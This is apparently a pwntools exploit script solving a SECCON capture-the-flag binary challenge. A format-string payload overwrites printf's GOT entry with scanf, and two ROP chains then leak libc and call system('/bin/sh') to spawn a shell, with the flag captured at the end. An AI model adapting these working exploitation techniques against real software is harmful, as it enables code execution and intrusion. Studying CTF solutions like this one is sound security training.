# Some diff on remote vs local
# remote requires multiple runs to get expected output from 
# format print payload. Sometimes, remote prints @@ as I expect.
# Other times, it does not. Debugging p.readuntil with p.interactive()
# showed this discrepency.

from pwn import *

context.log_level = 'error'
binary = './chall_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
context.arch = "amd64"
libc = context.binary.libc

p = process('./chall_patched')
#p = remote('paragraph.seccon.games', 5000)
#gdb.attach(p)


# Some info from static analysis
# printf_plt = 0x0401090
# printf_got = 0x0404028
# scanf_plt = 0x04010a0
# scanf_got = 0x0404030

# goal overwrite scanf_got with the address of printf_got
# Goal: overwrite printf with scanf
## Read/overflow buffer with rop chain to get a libc leak
## Second rop chain to get system(/bin/sh)

#print("system", hex(libc.sym['system']))
#print("printf", hex(elf.sym['printf']))
#print("scanf", hex(libc.sym['scanf']))
#print("printf", hex(elf.got['printf']))
#print("scanf", hex(libc.sym['scanf']))
#print("puts", hex(libc.sym['puts']))


payload = b"%4198560c%8$lln_" + p64(0x404028)[:6]
# printf is now scanf

p.readuntil(b"asked.\n")
p.sendline(payload)
p.readuntil(b"@@")

# Find offset for our rop chain
# g = cyclic_gen()
# print(g.get(50))
# -- b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
## found kaaalaaama -- value @ rsp
# offset = cyclic_find(b'kaaalaaama')
# print(offset)
offset = 40 # 0x28

ex = b'a'*40
# rop to leak a libc address and run main again
rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(pack(0x404050)) # stdout@@GLIBC_2.2.5
rop.raw(pack(0x401070)) # puts
rop.raw(pack(elf.sym['main']))

# input to scanf has to match the format print
payload = b' answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted '
payload += ex + rop.chain()
payload += b" warmly.I\n"
p.sendline(payload)

leak = p.recvline().strip()
leak = u64(leak.ljust(8, b"\x00"))
print("libc leak: ", hex(leak))
# example analysis to verify correct leak
# stdout@@GLIBC... -> 0x7fe38b6365c0 -- verified in gdb during run
# readelf -s libc.so.6 | grep stdout
## 9648: 00000000002045c0   224 OBJECT  GLOBAL DEFAULT   31 _IO_2_1_stdout_

libc.address = leak - 0x2045c0
print("libc base: ", hex(libc.address))
libc_system = libc.sym.system
print("libc system: ", hex(libc_system))
# readelf -s libc.so.6 | grep system --> 0x58740
# libc leak:  0x7fc4960b25c0
# libc base:  0x7fc495eae000
# libc system:  0x7fc495f06740
# the math is mathin


# at beginning of main again
p.sendlineafter(b'asked.\n', b'1') # just junk for first 1st scanf call
ex = b'a'*40
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret']))
rop.raw(rop.find_gadget(['pop rdi']))
rop.raw(pack(next(libc.search(b'/bin/sh'))))
rop.raw(pack(libc_system))

payload = b' answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted '
payload += ex + rop.chain()
payload += b" warmly.I\n"
p.sendline(payload)

p.sendline(b'id')

p.interactive()


# SECCON{The_cat_seemed_surprised_when_you_showed_this_flag.}
